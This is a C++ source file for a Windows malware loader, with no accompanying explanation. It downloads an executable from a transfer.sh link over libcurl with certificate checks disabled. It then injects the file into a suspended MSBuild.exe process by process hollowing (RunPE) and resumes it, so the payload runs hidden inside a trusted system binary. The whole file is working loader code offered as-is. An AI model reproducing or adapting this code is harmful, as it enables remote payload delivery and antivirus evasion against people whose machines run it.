#include <Windows.h> // WinAPI Header
#pragma once
#define _CRT_SECURE_NO_WARNINGS
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"Wldap32.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment(lib,"libcurl_a.lib")
#pragma comment(lib,"libsslMT.lib")
#pragma comment(lib,"libcryptoMT.lib")
#define CURL_STATICLIB
#include "curl\curl.h"

#define DEBUG

int CURLWriteNext;
BYTE * CURLDataBuffer[8192 * 6];

int CurlWriter(char *data, size_t size, size_t nmemb, void * userptr)
{
	int dSize = int(size * nmemb);

	BYTE * DestAddr = (BYTE*)&CURLDataBuffer[CURLWriteNext];
	int BufferSize = sizeof(CURLDataBuffer) - CURLWriteNext;

	if ((CURLWriteNext + dSize) > BufferSize)
	{
#ifdef DEBUG
		MessageBoxA(0,"CURL buffer overflow!","ERROR", MB_OK | MB_ICONERROR);
#endif
		ExitProcess(0);
	}

	memset(DestAddr, 0, dSize);
	memcpy(DestAddr, data, dSize);
	CURLWriteNext += dSize;

	return dSize;
}

BYTE * DownloadData(char * URL)
{
	CURL * chInit = curl_easy_init();

	if (!chInit)
	{
#ifdef DEBUG
		MessageBoxA(0, "curl_easy_init() failed!", "ERROR", MB_OK | MB_ICONERROR);
#endif
		return NULL;
	}

	curl_easy_setopt(chInit, CURLOPT_HEADER, TRUE);
	curl_easy_setopt(chInit, CURLOPT_WRITEFUNCTION, CurlWriter);
	curl_easy_setopt(chInit, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_easy_setopt(chInit, CURLOPT_URL, URL);

	BYTE  * ret = (BYTE*)(curl_easy_perform(chInit) != CURLE_OK ? NULL : CURLDataBuffer);

	curl_easy_cleanup(chInit);

	return ret;
}

BYTE * GetExecutableData(BYTE * pDownloadData)
{
	for (int i = 0; i < CURLWriteNext; i++)
	{
		if (*(DWORD*)(CURLDataBuffer + i) == 0x00905a4d)
		{
			return (BYTE*)&CURLDataBuffer[i];
		}
	}

	return NULL;
}


void RunPortableExecutable(void* Image, char * Vector)
{
	IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
	IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects & symbols
	IMAGE_SECTION_HEADER* SectionHeader;

	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;

	DWORD* ImageBase; //Base address of the image
	void* pImageBase; // Pointer to the image base

	int count;

	DOSHeader = PIMAGE_DOS_HEADER(Image); // Initialize Variable
	NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew); // Initialize

	if (NtHeader->Signature != IMAGE_NT_SIGNATURE) // Check if image is a PE File.
	{
#ifdef DEBUG
		MessageBoxA(0, "This is not an pe file!", "ERROR", MB_OK | MB_ICONERROR);
#endif
		return;
	}

	memset(&PI, 0, sizeof(PI)); // Null the memory
	memset(&SI, 0, sizeof(SI)); // Null the memory

	if (!CreateProcessA(Vector, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) // Create a new instance of current //process in suspended state, for the new image.
	{
#ifdef DEBUG
		MessageBoxA(0, "CreateProcessA failed!", "ERROR", MB_OK | MB_ICONERROR);
#endif
		return;
	}

	// Allocate memory for the context.
	CONTEXT PContext;
	PContext.ContextFlags = CONTEXT_FULL; // Context is allocated

	if (!GetThreadContext(PI.hThread, &PContext)) //if context is in thread
	{
#ifdef DEBUG
		MessageBoxA(0, "GetThreadContext failed!", "ERROR", MB_OK | MB_ICONERROR);
#endif
		return;
	}

	// Read instructions
	if (!ReadProcessMemory(PI.hProcess, LPCVOID(PContext.Ebx + 8), LPVOID(&ImageBase), 4, 0))
	{
#ifdef DEBUG
		MessageBoxA(0, "ReadProcessMemory failed!", "ERROR", MB_OK | MB_ICONERROR);
#endif
		return;
	}

	pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase), NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

	if (!pImageBase)
	{
#ifdef DEBUG
		MessageBoxA(0, "VirtualAllocEx failed!", "ERROR", MB_OK | MB_ICONERROR);
#endif
		return;
	}

	// Write the image to the process
	if (!WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL))
	{
#ifdef DEBUG
		MessageBoxA(0, "WriteProcessMemory(1) failed!", "ERROR", MB_OK | MB_ICONERROR);
#endif
		return;
	}

	for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
	{
		SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));

		if (!WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress), LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0))
		{
#ifdef DEBUG
			MessageBoxA(0, "WriteProcessMemory(2) failed!", "ERROR", MB_OK | MB_ICONERROR);
#endif
			return;
		}
	}

	if (!WriteProcessMemory(PI.hProcess, LPVOID(PContext.Ebx + 8), LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0))
	{
#ifdef DEBUG
		MessageBoxA(0, "WriteProcessMemory(3) failed!", "ERROR", MB_OK | MB_ICONERROR);
#endif
		return;
	}


	// Move address of entry point to the eax register
	PContext.Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
	
	if (!SetThreadContext(PI.hThread, &PContext))
	{
#ifdef DEBUG
		MessageBoxA(0, "SetThreadContext failed!", "ERROR", MB_OK | MB_ICONERROR);
#endif
		return;
	}

	ResumeThread(PI.hThread); //´Start the process/call main()
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	BYTE * pDownloadData = DownloadData("https://transfer.sh/NPzYYP/WindowsFormsApp2.exe");
	if (!pDownloadData)
	{
#ifdef DEBUG
		MessageBoxA(0, "CURL return null!", "ERROR", MB_OK | MB_ICONERROR);
#endif
		return 0;
	}


	BYTE * pExecutableData = GetExecutableData(pDownloadData);
	if (!pDownloadData)
	{
#ifdef DEBUG
		MessageBoxA(0, "Executable data not found!", "ERROR", MB_OK | MB_ICONERROR);
#endif
		return 0;
	}

	RunPortableExecutable(pExecutableData, "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe");

	return 0;
}